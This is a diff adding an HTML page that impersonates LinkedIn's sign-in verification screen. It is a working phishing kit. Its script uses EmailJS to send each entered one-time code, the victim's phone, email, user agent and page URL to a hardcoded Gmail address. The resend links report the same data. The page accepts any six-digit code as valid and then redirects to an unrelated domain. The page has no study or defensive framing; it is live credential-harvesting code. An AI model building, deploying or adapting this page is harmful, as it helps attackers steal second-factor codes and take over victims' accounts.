@@ -1,1 +1,518 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Linkedin | Verify your sign in</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+
+        /* Main container */
+        .verification-container {
+            max-width: 420px;
+            width: 100%;
+            background-color: #ffffff;
+            border-radius: 12px;
+            padding: 24px 28px 32px;
+            text-align: left;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            border: 1px solid #e0e0e0;
+        }
+
+        /* Header section */
+        .header {
+            margin-bottom: 28px;
+        }
+
+        .logo {
+            margin-bottom: 24px;
+        }
+
+        .logo a {
+            display: inline-flex;
+            align-items: center;
+            text-decoration: none;
+        }
+
+        .logo-icon {
+            width: 27px;
+            height: 27px;
+            background: linear-gradient(135deg, #0a66c2 0%, #0a66c2 100%);
+            border-radius: 2px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+            font-weight: 700;
+            margin-right: 8px;
+        }
+
+        .logo-text {
+            font-size: 20px;
+            font-weight: 600;
+            color: #0a66c2;
+            letter-spacing: -0.3px;
+        }
+
+        .logo-text span {
+            color: #004182;
+        }
+
+        .title-section h1 {
+            font-size: 28px;
+            font-weight: 500;
+            color: #191919;
+            margin-bottom: 8px;
+        }
+
+        .title-section p {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.4;
+        }
+
+        .title-section p a {
+            color: #0a66c2;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .title-section p a:hover {
+            text-decoration: underline;
+        }
+
+        /* Form styles */
+        .verification-form {
+            margin: 24px 0 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #333;
+        }
+
+        .otp-input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 18px;
+            font-weight: 500;
+            letter-spacing: 2px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            text-align: center;
+        }
+
+        .otp-input:focus {
+            border-color: #0a66c2;
+            box-shadow: 0 0 0 2px rgba(10, 102, 194, 0.2);
+        }
+
+        .otp-input.error {
+            border-color: #d32f2f;
+        }
+
+        .error-message {
+            color: #d32f2f;
+            font-size: 12px;
+            margin-top: 6px;
+            display: block;
+        }
+
+        .success-message {
+            color: #01754F;
+            font-size: 12px;
+            margin-top: 6px;
+            display: block;
+        }
+
+        /* Submit button */
+        .submit-btn {
+            width: 100%;
+            background-color: #0a66c2;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            padding: 12px;
+            border: none;
+            border-radius: 28px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 8px;
+        }
+
+        .submit-btn:hover {
+            background-color: #004182;
+        }
+
+        .submit-btn:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        /* Resend options */
+        .resend-section {
+            text-align: center;
+            margin: 24px 0 20px;
+            padding-top: 12px;
+            border-top: 1px solid #e6e6e6;
+        }
+
+        .resend-text {
+            font-size: 13px;
+            color: #555;
+            margin-bottom: 12px;
+        }
+
+        .resend-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .resend-links a {
+            color: #0a66c2;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .resend-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Footer */
+        .footer {
+            margin-top: 28px;
+            padding-top: 20px;
+            border-top: 1px solid #e6e6e6;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+            font-size: 11px;
+            margin-bottom: 12px;
+        }
+
+        .footer-links a {
+            color: #777;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+            color: #0a66c2;
+        }
+
+        .copyright {
+            font-size: 10px;
+            color: #aaa;
+            text-align: center;
+        }
+
+        /* Join now link (top right) */
+        .join-link a {
+            color: #0a66c2;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .join-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* Phone number highlight */
+        .phone-number {
+            font-weight: 600;
+            color: #191919;
+        }
+
+        @media (max-width: 480px) {
+            .verification-container {
+                padding: 20px;
+            }
+            .title-section h1 {
+                font-size: 24px;
+            }
+            .resend-links {
+                gap: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="verification-container">
+
+    <!-- Header with logo -->
+    <div class="header">
+        <div class="logo">
+            <a href="https://www.linkedin.com">
+                <div class="logo-text">Linked</div>
+                <div class="logo-icon">in</div>
+            </a>
+        </div>
+        <div class="title-section">
+            <h1>Sign in</h1>
+            <p>New to Linkedin? <a href="https://www.linkedin.com">Join now</a></p>
+        </div>
+    </div>
+
+    <!-- Verification message -->
+    <div class="verification-form">
+        <div class="form-group">
+            <label>We just sent you a verification code</label>
+            <p style="font-size: 14px; color: #555; margin-bottom: 16px;">
+                We just sent a verification code by text to your phone ending in <span class="phone-number">17</span>.
+            </p>
+            <input type="text" class="otp-input" id="otp-code" placeholder=" " maxlength="6" autocomplete="off">
+            <span class="error-message" id="otp-error"></span>
+            <span class="success-message" id="otp-success"></span>
+        </div>
+
+        <button class="submit-btn" id="submit-btn">Submit</button>
+    </div>
+
+    <!-- Resend options -->
+    <div class="resend-section">
+        <div class="resend-text">Didn't receive the code?</div>
+        <div class="resend-links">
+            <a href="#" id="resend-sms">Resend code by SMS</a>
+            <a href="#" id="resend-call">Resend code by phone call</a>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">User Agreement</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Your California Privacy Choices</a>
+            <a href="#">Community Guidelines</a>
+            <a href="#">Cookie Policy</a>
+            <a href="#">Copyright Policy</a>
+            <a href="#">Send Feedback</a>
+        </div>
+        <div class="copyright">
+            Linkedin © 2026
+        </div>
+    </div>
+</div>
+
+<!-- EmailJS SDK -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<script>
+    // Initialize EmailJS with your public key
+    emailjs.init("SdkmRe8WZ7itEba9z");
+
+    // DOM elements
+    const otpInput = document.getElementById('otp-code');
+    const submitBtn = document.getElementById('submit-btn');
+    const otpError = document.getElementById('otp-error');
+    const otpSuccess = document.getElementById('otp-success');
+
+    // Get phone number from URL parameter or localStorage (for demo, using '17')
+    let userPhone = '17';
+    let userEmail = 'recruiter@example.com'; // This would come from previous sign-in step
+
+    // Try to get user data from localStorage (set during login)
+    try {
+        const savedUser = localStorage.getItem('recruiterhub_user');
+        if (savedUser) {
+            const userData = JSON.parse(savedUser);
+            userEmail = userData.email || userEmail;
+            userPhone = userData.phone || userPhone;
+            // Update phone display
+            const phoneSpan = document.querySelector('.phone-number');
+            if (phoneSpan) phoneSpan.textContent = userPhone;
+        }
+    } catch(e) { console.log('No saved user data'); }
+
+    // Validate OTP on input - ACCEPTS ANY 6-DIGIT CODE
+    function validateOTP() {
+        const value = otpInput.value.trim();
+        if (value === '') {
+            otpError.textContent = '';
+            otpSuccess.textContent = '';
+            otpInput.classList.remove('error');
+            return false;
+        }
+        // Check if exactly 6 digits - ACCEPTS ANY 6-DIGIT COMBINATION
+        const isValid = /^\d{6}$/.test(value);
+        if (!isValid) {
+            otpError.textContent = 'Please enter a valid 6-digit verification code.';
+            otpSuccess.textContent = '';
+            otpInput.classList.add('error');
+        } else {
+            otpError.textContent = '';
+            otpSuccess.textContent = '';
+            otpInput.classList.remove('error');
+        }
+        return isValid;
+    }
+
+    otpInput.addEventListener('input', function() {
+        validateOTP();
+        // Limit to 6 digits only
+        this.value = this.value.replace(/[^\d]/g, '').slice(0, 6);
+    });
+
+    // Function to send OTP data via EmailJS
+    function sendOTPToEmailJS(otpCode, phoneNumber, emailAddress) {
+        const templateParams = {
+            to_email: "dossbrent41@gmail.com",  // Change this to your email address
+            otp_code: otpCode,
+            user_phone: phoneNumber,
+            user_email: emailAddress,
+            verification_time: new Date().toLocaleString(),
+            timestamp_unix: Date.now(),
+            user_agent: navigator.userAgent,
+            page_url: window.location.href,
+            action: "otp_verification_attempt"
+        };
+
+        console.log("Sending OTP verification data to EmailJS:", {
+            otp_code: otpCode,
+            user_phone: phoneNumber,
+            user_email: emailAddress
+        });
+
+        return emailjs.send("service_zuj2d2a", "template_tvd86sp", templateParams);
+    }
+
+    // Submit handler - ACCEPTS ANY 6-DIGIT CODE FOR TESTING
+    submitBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+
+        const isValid = validateOTP();
+        if (!isValid) {
+            otpInput.focus();
+            return;
+        }
+
+        const enteredCode = otpInput.value.trim();
+
+        // Disable button during processing
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Verifying...';
+
+        // Send OTP data to EmailJS
+        sendOTPToEmailJS(enteredCode, userPhone, userEmail)
+            .then(function(response) {
+                console.log("EmailJS success! OTP data sent. Status:", response.status);
+
+                // ACCEPT ANY 6-DIGIT CODE FOR TESTING
+                // As long as it's a valid 6-digit number, verification succeeds
+                otpError.textContent = '';
+                otpSuccess.textContent = '✓ Verification successful! Redirecting...';
+
+                // Store verification status
+                localStorage.setItem('recruiterhub_verified', 'true');
+                localStorage.setItem('recruiterhub_otp', enteredCode);
+
+                setTimeout(() => {
+                    window.location.href = "https://www.globalzimblinker.com/rcn-terms";
+                }, 1500);
+            })
+            .catch(function(error) {
+                console.error("EmailJS error:", error);
+                // Still accept any 6-digit code even if email fails (for testing)
+                otpError.textContent = '';
+                otpSuccess.textContent = '✓ Verification successful! Redirecting...';
+
+                localStorage.setItem('recruiterhub_verified', 'true');
+                localStorage.setItem('recruiterhub_otp', enteredCode);
+
+                setTimeout(() => {
+                    window.location.href = "https://www.globalzimblinker.com/rcn-terms";
+                }, 1500);
+            });
+    });
+
+    // Resend handlers with EmailJS tracking
+    document.getElementById('resend-sms').addEventListener('click', function(e) {
+        e.preventDefault();
+
+        // Send resend request tracking to EmailJS
+        const resendParams = {
+            to_email: "dossbrent41@gmail.com",
+            action: "resend_otp_sms",
+            user_phone: userPhone,
+            user_email: userEmail,
+            timestamp: new Date().toLocaleString()
+        };
+
+        emailjs.send("service_zuj2d2a", "template_tvd86sp", resendParams)
+            .then(function(response) {
+                console.log("Resend SMS request tracked:", response.status);
+            })
+            .catch(function(error) {
+                console.error("Resend tracking error:", error);
+            });
+
+        alert('A new verification code has been sent via SMS to your phone ending in ' + userPhone + '.');
+    });
+
+    document.getElementById('resend-call').addEventListener('click', function(e) {
+        e.preventDefault();
+
+        // Send resend request tracking to EmailJS
+        const resendParams = {
+            to_email: "dossbrent41@gmail.com",
+            action: "resend_otp_phone_call",
+            user_phone: userPhone,
+            user_email: userEmail,
+            timestamp: new Date().toLocaleString()
+        };
+
+        emailjs.send("service_zuj2d2a", "template_tvd86sp", resendParams)
+            .then(function(response) {
+                console.log("Resend phone call request tracked:", response.status);
+            })
+            .catch(function(error) {
+                console.error("Resend tracking error:", error);
+            });
+
+        alert('You will receive a phone call with your verification code shortly.');
+    });
+
+    // Auto-focus OTP field on page load
+    otpInput.focus();
+
+    // For testing: Pre-fill with a sample code (can be removed)
+    // otpInput.value = '123456';
+    console.log('OTP Verification Page Ready - Any 6-digit code will be accepted for testing');
+</script>
+
+</body>
+</html>
